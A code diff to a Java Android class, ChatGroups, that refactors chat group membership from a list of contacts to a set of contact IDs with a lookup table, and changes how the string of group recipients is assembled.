@@ -1,8 +1,11 @@
 package com.android.networking.module.chat;
 
 import java.util.ArrayList;
+import java.util.HashSet;
 import java.util.Hashtable;
 import java.util.List;
+import java.util.Set;
+import java.util.TreeSet;
 
 import com.android.networking.auto.Cfg;
 import com.android.networking.util.Check;
@@ -11,33 +14,40 @@ import com.android.networking.util.Check;
 public abstract class ChatGroups {
 	private static final String TAG = "ChatGroups";
     Contact contact;
-	final Hashtable<String, List<Contact>> groups = new Hashtable<String, List<Contact>>();
+    Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();
+    
+	final Hashtable<String, Set<String>> groups = new Hashtable<String, Set<String>>();
 	final Hashtable<String, String> tos = new Hashtable<String, String>();
 
 	void addPeerToGroup(String groupName, String remote) {
 		addPeerToGroup(groupName, new Contact(remote));
 	}
+	
 	/* identificato un gruppo si aggiunge, uno alla volta con questo metodo, un peer */
 	void addPeerToGroup(String groupName, Contact remote) {
 		if (Cfg.DEBUG) {
 			Check.requires(isGroup(groupName), "peer is not a group: " + groupName);
 			Check.log("Adding group " + groupName + " : " + remote);
 		}
-		List<Contact> list;
-		if (groups.containsKey(groupName)) {
-			list = groups.get(groupName);
-			if (!list.contains(remote)) {
-				list.add(remote);
-			}
-	
-		} else {
-			list = new ArrayList<Contact>();
-			list.add(remote);
+		
+		Set<String> set;
+		if (!groups.containsKey(groupName)) {
+			set = new HashSet<String>();
+		}else{
+			set = groups.get(groupName);
 		}
-	
-		groups.put(groupName, list);
+		
+		set.add(remote.id);
+		contacts.put(remote.id, remote);
+		
+		groups.put(groupName, set);
 	}
 
+	
+	Contact getContact(String id){
+		return contacts.get(id);
+	}
+	
 	/* dato un autore e un gruppo, restituisce la stringa di tutti i destinatari */
 	String getGroupTo(String author, String groupname) {
 		String key = author + groupname;
@@ -45,14 +55,15 @@ public abstract class ChatGroups {
 			return tos.get(key);
 		}
 
-		List<Contact> list = groups.get(groupname);
-		if(list==null){
+		Set<String> set = groups.get(groupname);
+		if(set==null){
 			return null;
 		}
 		StringBuilder builder = new StringBuilder();
-		for (Contact p : list) {
-			if (!author.equals(p.id)) {
-				builder.append(p.id);
+		for (String cid : set) {
+			Contact c = contacts.get(cid);
+			if (!author.equals(c.number) && !author.equals(cid)) {
+				builder.append(c.number);
 				builder.append(",");
 			}
 		}
